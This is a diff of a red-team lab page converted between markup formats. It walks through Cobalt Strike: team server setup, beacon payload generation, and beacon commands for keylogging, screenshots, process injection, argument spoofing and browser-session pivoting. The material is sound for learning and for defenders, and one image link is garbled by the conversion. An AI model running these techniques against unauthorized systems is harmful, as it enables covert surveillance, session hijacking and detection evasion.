@@ -12,27 +12,24 @@ This lab is for exploring the advanced penetration testing / post-exploitation t
 
 ### Team Server
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 # the syntax is ./teamserver <serverIP> <password> <~killdate> <~profile>
 # ~ optional for now
 root@/opt/cobaltstrike# ./teamserver 10.0.0.5 password
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-06 22-47-10.png>)
+![[Screenshot from 2019-01-06 22-47-10.png]]
 
-{% hint style="info" %}
-Note that in real life red team engagements, you would put the team servers behind redirectors to add resilience to your attacking infrastructure. See [Red Team Infrastructure](./)
-{% endhint %}
+> [!INFO]
+> Note that in real life red team engagements, you would put the team servers behind redirectors to add resilience to your attacking infrastructure. See [Red Team Infrastructure](./)
 
 ### Cobalt Strike Client
 
-{% code title="attacker@kali" %}
 ```csharp
+// attacker@kali
 root@/opt/cobaltstrike# ./cobaltstrike
 ```
-{% endcode %}
 
 Enter the following:
 
@@ -40,37 +37,37 @@ Enter the following:
 * user - anything you like - it's just a nickname
 * password - your team server password
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-06 22-51-40.png>)
+![[Screenshot from 2019-01-06 22-51-40.png]]
 
 ### Demo
 
 All of the above steps are shown below in one animated gif:
 
-![](<../../.gitbook/assets/Peek 2019-01-06 22-56.gif>)
+![[Peek 2019-01-06 22-56.gif]]
 
 ## Setting Up Listener
 
 Give your listener a descriptive name and a port number the team server should bind to and listen on:
 
-![](<../../.gitbook/assets/Peek 2019-01-07 18-01 (1) (1) (1).gif>)
+![[Peek 2019-01-07 18-01 (1]] (1) (1).gif>)
 
 ## Generating a Stageless Payload
 
 Generate a stageless (self-contained exe) beacon - choose the listener your payload will connect back to and payload architecture and you are done:
 
-![](<../../.gitbook/assets/Peek 2019-01-07 18-03.gif>)
+![[Peek 2019-01-07 18-03.gif]]
 
 ## Receiving First Call Back
 
 On the left is a victim machine, executing the previously generated beacon - and on the left is a cobalt strike client connected to the teamserver catching the beacon callback:
 
-![](<../../.gitbook/assets/Peek 2019-01-07 18-15.gif>)
+![[Peek 2019-01-07 18-15.gif]]
 
 ## Interacting with Beacon
 
 Right click the beacon and select interact. Note the new tab opening at the bottom of the page that allows an attacker issuing commdands to the beacon:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 18-22-38.png>)
+![[Screenshot from 2019-01-07 18-22-38.png]]
 
 ## Interesting Commands & Features
 
@@ -80,107 +77,100 @@ Argue command allows the attacker to spoof commandline arguments of the process 
 
 The below spoofs calc command line parameters:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> argue calc /spoofed
 beacon> run calc
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 19-18-23.png>)
+![[Screenshot from 2019-01-07 19-18-23.png]]
 
 Note the differences in commandline parameters captured in sysmon vs procexp:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 19-09-47.png>)
+![[Screenshot from 2019-01-07 19-09-47.png]]
 
 Argument spoofing is done via manipulating memory structures in Process Environment Block which I have some notes about:
 
-{% content-ref url="../defense-evasion/masquerading-processes-in-userland-through-_peb.md" %}
-[masquerading-processes-in-userland-through-\_peb.md](../defense-evasion/masquerading-processes-in-userland-through-\_peb.md)
-{% endcontent-ref %}
 
-{% content-ref url="../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md" %}
+[masquerading-processes-in-userland-through-\_peb.md](../defense-evasion/masquerading-processes-in-userland-through-\_peb.md)
+
+
+
 [exploring-process-environment-block.md](../../miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block.md)
-{% endcontent-ref %}
+
 
 ### Inject
 
 Inject is very similar to metasploit's `migrate` function and allows an attacker to duplicate their beacon into another process on the victim system:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> help inject
 Use: inject [pid] <x86|x64> [listener]
 
 inject 776 x64 httplistener
 ```
-{% endcode %}
 
 Note how after injecting the beacon to PID 776, another session is spawned:
 
-![](<../../.gitbook/assets/Peek 2019-01-07 20-16.gif>)
+![[Peek 2019-01-07 20-16.gif]]
 
 ### Keylogger
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> keylogger 1736 x64
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-31-30.png>)
+![[Screenshot from 2019-01-07 20-31-30.png]]
 
 ### Screenshot
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> screenshot 1736 x64
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-33-51.png>)
+![[Screenshot from 2019-01-07 20-33-51.png]]
 
 ### Runu
 
 Runu allows us launching a new process from a specified parent process:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 runu 2316 calc
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-39-20.png>)
+![[Screenshot from 2019-01-07 20-39-20.png]]
 
 ### Psinject
 
 This function allows an attacker executing powershell scripts from under any process on the victim system. Note that PID 2872 is the calc.exe process seen in the above screenshot related to `runu`:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> psinject 2872 x64 get-childitem c:\
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-44-30.png>)
+![[Screenshot from 2019-01-07 20-44-30.png]]
 
 Highlighted in green are new handles that are opened in the target process when powershell script is being injected:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-52-16.png>)
+![[Screenshot from 2019-01-07 20-52-16.png]]
 
 ### Spawnu
 
 Spawn a session with powershell payload from a given parent PID:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> spawnu 3848 httplistener
 ```
-{% endcode %}
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-57-30.png>)
+![[Screenshot from 2019-01-07 20-57-30.png]]
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 20-57-25.png>)
+![[Screenshot from 2019-01-07 20-57-25.png]]
 
 ### Browser Pivoting
 
@@ -196,37 +186,36 @@ The way this attack works is best explained with an example:
 
 Browser pivotting in cobalt strike:
 
-{% code title="attacker@cs" %}
 ```csharp
+// attacker@cs
 beacon> browserpivot 244 x86
 ```
-{% endcode %}
 
 Note how the iexplore.exe opened up port 6605 for listening as mentioned earlier:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 21-23-50.png>)
+![[Screenshot from 2019-01-07 21-23-50.png]]
 
 The below illustrates the attack visually. On the left - a victim system logged to some application and on the right - attacker id trying to access the same application and gets presented with a login screen since they are not authenticated:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 21-33-54.png>)
+![[Screenshot from 2019-01-07 21-33-54.png]]
 
 The story changes if the attacker starts proxying his web traffic through the victim proxy `10.0.0.5:33912`:
 
-![](<../../.gitbook/assets/Peek 2019-01-07 21-36.gif>)
+![[Peek 2019-01-07 21-36.gif]]
 
 ### System Profiler
 
 A nice feature that profiles potential victims by gathering information on what software / plugins victim system has installed:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 21-52-32.png>)
+![[Screenshot from 2019-01-07 21-52-32.png]]
 
 Once the the profilder URL is visited, findings are presented in the Application view:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 21-52-58.png>)
+![[Screenshot from 2019-01-07 21-52-58.png]]
 
 Event logs will show how many times the profiler has been used by victims:
 
-![](<../../.gitbook/assets/Screenshot from 2019-01-07 21-52-50.png>)
+![[Screenshot from 2019-01-07 21-52-50.png]]
 
 ## References
 
